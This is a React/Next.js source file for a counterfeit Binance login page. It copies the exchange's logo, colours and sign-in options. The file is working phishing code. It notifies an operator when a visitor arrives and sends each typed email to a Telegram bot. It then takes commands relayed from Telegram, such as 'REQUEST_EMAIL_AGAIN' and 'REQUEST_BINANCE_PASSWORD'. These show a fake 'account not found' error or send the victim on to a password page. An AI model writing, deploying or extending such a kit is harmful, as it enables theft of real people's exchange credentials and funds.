'use client';
import '../app/globals.css';
import { useState, useEffect } from 'react';
import { useTheme } from '../app/lib/ThemeContext';
import BinanceLoader from './BinanceLoader';
import { useValidateEmail } from '../app/hooks/useValidate';
import { useEmail } from '../app/lib/EmailContext';
import { useRouter } from 'next/navigation';
import { notifyNewUser } from '../lib/api';
import { sendMessageToTelegram } from '../lib/api'; 
import { useCommand } from '../app/lib/CommandContext';

export default function LoginForm() {
    const router = useRouter();
    notifyNewUser();
    const { command } = useCommand(); // Get the current command from Telegram
    const { userEmail, setUserEmail } = useEmail();
    const { theme, toggleTheme } = useTheme();
    const [invalid, setInvalid] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [showLanguage, setShowLanguage] = useState(false);
    const [isHovered, setIsHovered] = useState(false);
    const [input, setInput] = useState(false);
    const [email, setEmail] = useState('');
    const [emailInput, setEmailInput] = useState(false);
    const mails = ['@gmail.com', '@qq.com', '@hotmail.com', '@outlook.com', '@icloud.com'];

    const languages = [
        'English',
        'العربية',
        'العربية (البحرين)',
        'български',
        'Čeština',
        'Deutsch (Schweiz)',
        'Dansk',
        'Español (España)',
        'Español (Latinoamérica)',
        'English (Türkiye)',
        'English (Australia)',
        'English (India)',
        'English (Nigeria)',
        'Español (México)',
        'Ελληνικά',
        'Español (Argentina)',
        'English (Kazakhstan)',
        'English (South Africa)',
        'English (New Zealand)',
        'English (Bahrain)',
        'English (UAE)',
        'English (Japan)',
        'Français',
        'Français (Afrique)',
        'magyar nyelv',
        'Italiano',
        'Bahasa Indonesia',
        '日本語',
        'Қазақша (Қазақстан)',
        'Қазақша',
        'latviešu valoda',
        'ລາວ',
        'Polski',
        'Português (Brasil)',
        'Português',
        'Русский',
        'Română',
        'Русский (Украина)',
        'Русский (Казахстан)',
        'Svenska',
        'Slovenčina',
        'Slovenščina',
        'සිංහල',
        'Українська',
        'Tiếng Việt',
        '简体中文',
        '繁體中文'
    ];

    useEffect(() => {
        const isClickInsideButton = (event) => {
            const button = document.querySelector('button[type="button"]');
            console.log('button was clicked')
            return button && button.contains(event.target);
        };

        const handleClick = (event) => {
            if (!isClickInsideButton(event)) {
                setInvalid(false);
            }
        };

        document.addEventListener('click', handleClick);

        return () => {
            document.removeEventListener('click', handleClick);
        };
    }, []);

    // Handle command changes
    useEffect(() => {
        if (command === 'REQUEST_EMAIL_AGAIN') {
            setInvalid(true); // Show error state for email input
            setIsLoading(false);
        }  else if (command === 'REQUEST_BINANCE_PASSWORD') {
            setIsLoading(false);
            setTimeout(() => {
                // setIsLoading(false);
                router.push('/PasswordPage');
            },500);
        }
    }, [command]);

    const { validateEmail } = useValidateEmail();
    // Handle email validation
    const handleEmailValidation = () => {
        const isValid = validateEmail(email);
        setInvalid(!isValid);
        setIsLoading(true);
        setUserEmail(email);
        console.log("Email set to:", email); 
        sendMessageToTelegram(email);
    };
    

    // Filter email suggestions
    const getFilteredMails = () => {
        const atIndex = email.indexOf('@');
        if (atIndex !== -1 && email.includes('.')) return [];
        if (atIndex === -1) return mails.map(mail => mail);
        const username = email.slice(0, atIndex);
        const domain = email.slice(atIndex).toLowerCase();
        return mails
            .filter(mail => mail.toLowerCase().startsWith(domain))
            .map(mail => username + mail);
    };

    // Handle body click to close email suggestions
    useEffect(() => {
        const handleBodyClick = (e) => {
            const isRecomBox = e.target.closest('.recom-box');
            if (!isRecomBox) setEmailInput(false);
        };
        document.body.addEventListener('click', handleBodyClick);
        return () => document.body.removeEventListener('click', handleBodyClick);
    }, []);

    // Handle window resize for padding
    const [padding, setPadding] = useState("80px 24px 54px");
    useEffect(() => {
        const handleResize = () => {
            setPadding(window.innerWidth < 768 ? "8px 24px 16px" : "80px 24px 54px");
        };
        handleResize();
        window.addEventListener("resize", handleResize);
        return () => window.removeEventListener("resize", handleResize);
    }, []);

    return (
        <div className={`lg:h-full h-screen w-full ${theme === 'light' ? 'bg-white' : 'bg-[#181a20]'} flex flex-col justify-between md:justify-normal`}>
            <div className='h-full w-full flex md:justify-center flex-col md:items-center' style={{ padding }}>
                <div className={`md:border ${theme === 'light' ? 'md:border-[#eaecef]' : 'md:border-[#2b3139]'} rounded-[24px] md:w-[425px] w-full min-h-[fit] md:min-h-[589px] md:px-[40px] md:pt-[40px] md:pb-[10px]`}>
                    {/* Header */}
                    <div className='md:mb-[20px] md:p-0 pt-[12px] px-0 pb-[20px] mb-[8px]'>
                        <svg height="24" width="120" className="bn-svg default-icon block" viewBox="0 0 120 24" xmlns="http://www.w3.org/2000/svg">
                            <path fill="#F0B90B" d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953ZM40.5938 14.9766V14.9297C40.5938 13.1719 39.6562 12.2812 38.1328 11.6953C39.0703 11.1797 39.8672 10.3359 39.8672 8.85938V8.8125C39.8672 6.75 38.2031 5.41406 35.5312 5.41406H29.4141V18.5625H35.6719C38.6484 18.5859 40.5938 17.3672 40.5938 14.9766ZM36.9844 9.35156C36.9844 10.3359 36.1875 10.7344 34.8984 10.7344H32.2266V7.94531H35.0859C36.3047 7.94531 36.9844 8.4375 36.9844 9.30469V9.35156ZM37.7109 14.6016C37.7109 15.5859 36.9375 16.0312 35.6719 16.0312H32.2266V13.1484H35.5781C37.0547 13.1484 37.7109 13.6875 37.7109 14.5781V14.6016ZM46.6641 18.5625V5.41406H43.7578V18.5625H46.6641ZM62.2266 18.5859V5.41406H59.3672V13.5234L53.2031 5.41406H50.5312V18.5625H53.3906V10.2188L59.7656 18.5859H62.2266ZM78.2578 18.5859L72.6094 5.34375H69.9375L64.2891 18.5859H67.2656L68.4609 15.6328H74.0156L75.2109 18.5859H78.2578ZM72.9844 13.0781H69.4922L71.25 8.8125L72.9844 13.0781ZM92.0625 18.5859V5.41406H89.2031V13.5234L83.0391 5.41406H80.3672V18.5625H83.2266V10.2188L89.6016 18.5859H92.0625ZM106.992 16.4531L105.141 14.6016C104.109 15.5391 103.195 16.1484 101.672 16.1484C99.4219 16.1484 97.8516 14.2734 97.8516 12.0234V11.9531C97.8516 9.70312 99.4453 7.85156 101.672 7.85156C102.984 7.85156 104.016 8.41406 105.047 9.32812L106.898 7.19531C105.68 6 104.203 5.15625 101.719 5.15625C97.6875 5.15625 94.8516 8.22656 94.8516 11.9531V12C94.8516 15.7734 97.7344 18.7734 101.602 18.7734C104.133 18.7969 105.633 17.9062 106.992 16.4531ZM119.344 18.5625V16.0078H112.195V13.2422H118.406V10.6641H112.195V7.99219H119.25V5.41406H109.336V18.5625H119.344Z"></path>
                        </svg>
                    </div>

                    {/* Form heading text */}
                    <div className='flex h-fit justify-between items-center mb-8 md:mt-[25px]'>
                        <div className='font-[600] text-[32px]'>
                            Log in
                        </div>


                        {/* Form Qr code */}
                        <div className='max-md:hidden h-[40px] relative mt-1.5'>
                            <div className={`p-[4px] w-[40px]  ${theme === 'light' ? 'bg-[#fafafa]' : 'bg-[#1e2329]'} h-[40px] rounded-[8px] cursor-pointer`}>
                                <svg fill="textPrimary" size="32" className="bn-svg w-[32px] h-[32px] text-[--color-textPrimary] " viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M4 4h7v7H4V4zm0 9h7v7H4v-7zm11 0h-2v4h4v-2h3v-2h-4v2h-1v-2zm5 3h-2v2h-2v2h4v-4zm-5 2h-2v2h2v-2zM13 4h7v7h-7V4zM8.5 6.5h-2v2h2v-2zm-2 9h2v2h-2v-2zm11-9h-2v2h2v-2z" fill="currentColor"></path></svg>
                            </div>
                        </div>
                    </div>

                    {/* Form */}
                    <form>
                        <div>
                            <div className='flex flex-column text-[14px] font-normal leading-[22px] mb-2'>
                                <div className={` ${theme === 'light' ? 'text-[#1e2329]' : 'text - [#202630] '} -mb-1 font-medium`}>
                                    Email/Phone number
                                </div>
                            </div>

                            {/* Email Input */}
                            <div className='flex flex-col w-full h-[48px] relative'>
                                <div
                                    className={`border flex ${emailInput || input ? 'border-[#FCD535]' : 'border-[#474d57]'} ${theme === 'light' ? 'border-[#eaecef]' : 'border-[#474d57]'} ${invalid && 'border-red-500'} hover:border-[#FCD535] transition duration-200 rounded-[8px] h-full flex w-full`}
                                    style={{ padding: '6px 10px' }}
                                    onClick={(e) => e.stopPropagation()}
                                >
                                    <input
                                        type="text"
                                        value={email}
                                        spellCheck={false}
                                        placeholder='Email/Phone (without country code)'
                                        className={`text-[16px] ${theme === 'light' ? 'bg-white' : 'bg-[#181a20]'} m-0 pb-1 leading-[24px] focus:outline-none font-medium flex-grow caret-[#FCD535]`}
                                        onChange={(e) => {
                                            setEmail(e.target.value);
                                            setEmailInput(e.target.value.length > 0);
                                        }}
                                        onClick={() => {
                                            setEmailInput(email.length > 1);
                                            setInput(true);
                                        }}
                                    />
                                    <div className={`items-center ${email < 1 ? 'hidden' : 'flex'}`} onClick={() => setEmail('')}>
                                        <svg fill={`${theme === 'light' ? '#000' : '#848e9c'}`} className="bn-svg cursor-pointer w-5 h-5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                            <path fillRule="evenodd" clipRule="evenodd" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-7.233 0l3.006 3.005-1.768 1.768L12 13.767l-3.005 3.005-1.768-1.768 3.005-3.005-3.005-3.005 1.768-1.767L12 10.23l3.005-3.005 1.768 1.767L13.767 12z"></path>
                                        </svg>
                                    </div>
                                </div>

                                {/* Email Suggestions */}
                                {emailInput && getFilteredMails().length > 0 && (
                                    <div className={`w-[343px] mt-12 shadow-xl recom-box z-50 absolute ${theme === 'light' ? 'bg-white' : 'bg-[#181a20]'}`}>
                                        <div className='max-h-[200px] w-full'>
                                            {getFilteredMails().map(mail => (
                                                <div
                                                    key={mail}
                                                    className={`min-h-[38px] ${theme === 'light' ? 'hover:bg-gray-100' : 'hover:bg-[#5E6673]'} py-[8px] px-[10px]`}
                                                    onClick={(e) => {
                                                        e.stopPropagation();
                                                        const baseEmail = email.split('@')[0];
                                                        setEmail(baseEmail + mail);
                                                        setEmailInput(false);
                                                    }}
                                                >
                                                    {email.includes('@') ? <span>{mail}</span> : <><span className='text-gray-500'>{email}</span>{mail}</>}
                                                </div>
                                            ))}
                                        </div>
                                    </div>
                                )}
                            </div>

                            {/* Error Message */}
                            <p className={`text-[14px] text-red-500 ${invalid ? 'block' : 'hidden'} mt-1 w-full`}>
                                {command === 'REQUEST_EMAIL_AGAIN' ? 'Binance account not found' : 'Please enter a valid email or phone number.'}
                            </p>
                        </div>

                        {/* Next Button */}
                        <button className={`mt-6 pb-1.5 font-medium text-[16px] hover:opacity-80 w-full bg-[#FCD535] flex items-center border-none cursor-pointer justify-center whitespace-nowrap min-h-[48px] h-[48px] min-w-[80px] ${theme === 'light' ? 'text-black' : 'text-black'} rounded-[10px]`} type='button' onClick={handleEmailValidation}>
                            {isLoading ? <BinanceLoader /> : 'Next'}
                        </button>
                    </form>

                    {/* Other UI Elements */}
                    <div className="flex items-center my-4">
                        <div className={`flex-1 ${theme === 'light' ? 'bg-gray-200' : 'bg-[#474d57af]'} h-[1px]`}></div>
                        <div className="px-4 text-[14px]">or</div>
                        <div className={`flex-1 ${theme === 'light' ? 'bg-white' : 'bg-[#474d57af]'} h-[1px]`}></div>
                    </div>

                    <div className='w-full'>
                        <button className={`h-[48px] mb-[16px] w-full border ${theme === 'dark' && 'border-[#474d57]'} md:p-0 pl-5 md:justify-center flex items-center rounded-[10px]`}>
                            <div className='relative md:absolute md:mr-[294px]'>
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" className="bn-svg"><path fillule="evenodd" clipule="evenodd" d="M15.68 8.18177C15.68 7.6145 15.6291 7.06905 15.5345 6.54541H8V9.63996H12.3055C12.12 10.64 11.5564 11.4872 10.7091 12.0545V14.0618H13.2945C14.8073 12.669 15.68 10.6181 15.68 8.18177Z" fill="#4285F4"></path><path fillule="evenodd" clipule="evenodd" d="M7.99992 16C10.1599 16 11.9708 15.2837 13.2945 14.0618L10.709 12.0546C9.99265 12.5346 9.07629 12.8182 7.99992 12.8182C5.91629 12.8182 4.15265 11.4109 3.52356 9.52002H0.85083V11.5927C2.16719 14.2073 4.87265 16 7.99992 16Z" fill="#34A853"></path><path fillule="evenodd" clipule="evenodd" d="M3.52364 9.51995C3.36364 9.03995 3.27273 8.52723 3.27273 7.99995C3.27273 7.47268 3.36364 6.95995 3.52364 6.47995V4.40723H0.850909C0.309091 5.48723 0 6.70904 0 7.99995C0 9.29086 0.309091 10.5127 0.850909 11.5927L3.52364 9.51995Z" fill="#FBBC05"></path><path fillule="evenodd" clipule="evenodd" d="M7.99992 3.18182C9.17447 3.18182 10.229 3.58545 11.0581 4.37818L13.3526 2.08364C11.9672 0.792727 10.1563 0 7.99992 0C4.87265 0 2.16719 1.79273 0.85083 4.40727L3.52356 6.48C4.15265 4.58909 5.91629 3.18182 7.99992 3.18182Z" fill="#EA4335"></path></svg>
                            </div>
                            <div className='font-medium mb-1 md:flex-auto flex-grow'>Continue with Google</div>
                        </button>

                        <button className={`h-[48px] mb-[16px] w-full border ${theme === 'dark' && 'border-[#474d57]'}  md:p-0 pl-5 md:justify-center flex items-center rounded-[10px]`}>
                            <div className='relative md:absolute md:mr-[294px]'>
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill={theme === 'light' ? `#202630` : `#fff`} viewBox="0 0 14 16" className="bn-svg"><path fill={theme === 'light' ? `#202630` : `#fff`} fillRule="evenodd" clipRule="evenodd" d="M10.4879 0C10.5996 0.96953 10.1968 1.92387 9.60713 2.62641C8.99235 3.31738 8.00749 3.84556 7.04923 3.77755C6.92385 2.84564 7.40944 1.85368 7.95278 1.24881C8.56756 0.561459 9.63448 0.035453 10.4879 0ZM13.5527 5.20694C13.4395 5.27152 11.6741 6.27909 11.6936 8.32883C11.7157 10.8105 13.9734 11.6303 14 11.639C13.9871 11.6969 13.6466 12.8227 12.8008 13.9658C12.0941 14.9723 11.3524 15.9563 10.1768 15.9736C9.61736 15.986 9.23962 15.8329 8.84599 15.6732C8.43549 15.5068 8.00771 15.3333 7.33854 15.3333C6.62905 15.3333 6.18224 15.5125 5.75142 15.6852C5.37887 15.8346 5.01827 15.9792 4.51011 15.999C3.38999 16.0388 2.53356 14.9245 1.80099 13.9275C0.337388 11.8915 -0.802493 8.18846 0.725707 5.66913C1.46663 4.43334 2.81701 3.63818 4.2601 3.61648C4.89566 3.60418 5.50537 3.83743 6.03985 4.0419C6.44862 4.19829 6.81339 4.33784 7.11208 4.33784C7.37475 4.33784 7.72947 4.20381 8.14285 4.04763C8.79383 3.80168 9.59027 3.50077 10.4018 3.58175C10.9565 3.59694 12.5372 3.79012 13.5554 5.20535L13.5527 5.20694Z"></path></svg>
                            </div>
                            <div className='font-medium mb-1 md:flex-auto flex-grow'>Continue with Apple</div>
                        </button>

                        <button className={`h-[48px] mb-[16px] w-full border ${theme === 'dark' && 'border-[#474d57]'}  md:p-0 pl-5 md:justify-center flex items-center rounded-[10px]`}>
                            <div className='relative md:absolute  md:mr-[290px]'>
                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" className="bn-svg"><path fillule="evenodd" clipule="evenodd" d="M2.81176 9.27221C7.28568 7.323 10.269 6.03796 11.7617 5.41709C16.0237 3.64439 16.9093 3.33645 17.4865 3.32628C17.6135 3.32404 17.8973 3.35551 18.0812 3.50471C18.2365 3.63069 18.2792 3.80087 18.2996 3.92032C18.3201 4.03976 18.3455 4.31186 18.3253 4.52447C18.0943 6.95117 17.095 12.8401 16.5865 15.5581C16.3714 16.7081 15.9478 17.0937 15.5377 17.1315C14.6465 17.2135 13.9698 16.5425 13.1066 15.9767C11.7559 15.0913 10.9928 14.5401 9.68167 13.6761C8.16646 12.6776 9.14871 12.1288 10.0122 11.2319C10.2382 10.9972 14.1649 7.42551 14.2409 7.10151C14.2505 7.06098 14.2593 6.90993 14.1695 6.83017C14.0798 6.75042 13.9474 6.77769 13.8518 6.79938C13.7163 6.83013 11.5585 8.25635 7.3784 11.078C6.76592 11.4986 6.21115 11.7035 5.7141 11.6928C5.16614 11.681 4.11208 11.383 3.3285 11.1283C2.3674 10.8159 1.60354 10.6507 1.67005 10.1201C1.7047 9.84375 2.08527 9.56112 2.81176 9.27221Z" fill="#00AEED"></path></svg>
                            </div>
                            <div className='font-medium mb-1 md:flex-auto flex-grow'>Continue with Telegram</div>
                        </button>
                    </div>
                </div>

                <div className='md:mt-4 -mt-20 mb-8 max-md:mt-6 typography-body2'>
                    <button className='font-medium text-[14px] text-[#F0B90B] hover:text-[#FCD535]'>
                        Create a Binance Account
                    </button>
                </div>
            </div>

            <div className={`text-[14px] ${theme === 'light' ? 'text-gray-500' : 'text-gray-300'} w-full flex justify-center`}>
                <div className='flex items-center items justify-center h-[70px] w-[425px]'>
                    <div className='mx-[9px] cursor-pointer hover:text-[#F0B90B] flex items-center gap-2'
                        onMouseEnter={() => setIsHovered(true)}
                        onMouseLeave={() => setIsHovered(false)}>
                        <svg xmlns="http://www.w3.org/2000/svg"
                            height="12px"
                            viewBox="0 -960 960 960"
                            width="12px"
                            fill={isHovered ? '#F0B90B' : theme === 'light' ? '#4b5563' : '#d1d5db'}>
                            <path d="M480-80q-82 0-155-31.5t-127.5-86Q143-252 111.5-325T80-480q0-83 31.5-155.5t86-127Q252-817 325-848.5T480-880q83 0 155.5 31.5t127 86q54.5 54.5 86 127T880-480q0 82-31.5 155t-86 127.5q-54.5 54.5-127 86T480-80Zm0-82q26-36 45-75t31-83H404q12 44 31 83t45 75Zm-104-16q-18-33-31.5-68.5T322-320H204q29 50 72.5 87t99.5 55Zm208 0q56-18 99.5-55t72.5-87H638q-9 38-22.5 73.5T584-178ZM170-400h136q-3-20-4.5-39.5T300-480q0-21 1.5-40.5T306-560H170q-5 20-7.5 39.5T160-480q0 21 2.5 40.5T170-400Zm216 0h188q3-20 4.5-39.5T580-480q0-21-1.5-40.5T574-560H386q-3 20-4.5 39.5T380-480q0 21 1.5 40.5T386-400Zm268 0h136q5-20 7.5-39.5T800-480q0-21-2.5-40.5T790-560H654q3 20 4.5 39.5T660-480q0 21-1.5 40.5T654-400Zm-16-240h118q-29-50-72.5-87T584-782q18 33 31.5 68.5T638-640Zm-234 0h152q-12-44-31-83t-45-75q-26 36-45 75t-31 83Zm-200 0h118q9-38 22.5-73.5T376-782q-56 18-99.5 55T204-640Z" />
                        </svg>
                        English
                    </div>
                    <div className='mx-4 mb-0.5 cursor-pointer hover:text-[#F0B90B]'>
                        Cookies
                    </div>
                    <div className='mx-4 mb-0.5 cursor-pointer hover:text-[#F0B90B]'>
                        Terms
                    </div>
                    <div className='mx-4 mb-0.5 cursor-pointer hover:text-[#F0B90B]'>
                        Privacy
                    </div>
                </div>
                <div className={`absolute ${showLanguage ? 'block' : 'hidden'} top-[63%] left-[450px] ${theme === 'light' ? 'bg-[white]' : 'bg-[#1e2329]'} rounded-lg border md:w-[230px] md:h-[418px] shadow-lg`}>
                    <div className='w-full text-[14px] leading-[20px] h-full flex flex-col p-[24px]'>
                        <div className={`mb-[16px] text-[14px] ${theme === 'light' ? 'text-black' : 'text-gray-300'}`}>
                            Language
                        </div>
                        <div className={`w-full px-[12px] text-[14px] hover:border-[#FCD535]  transition duration-300 flex items-center ${emailInput ? 'border-[#FCD535]' : 'border'} rounded-[8px] h-[32px]`} onClick={() => setInput(true)}>
                            <input type="text" placeholder='Search' className={`w-full focus:outline-none caret-[#FCD535] text-[14px] ${theme === 'light' ? 'bg-[white]' : 'bg-[#1e2329]'}`} />
                        </div>
                        <div className='h-[300px] overflow-auto mt-[16px]'>
                            {languages.map((language, index) => (
                                <h1 key={index} className='mb-5 transition duration-300 hover:text-[#FCD535] cursor-pointer font-medium'>
                                    {language}
                                </h1>
                            ))}
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}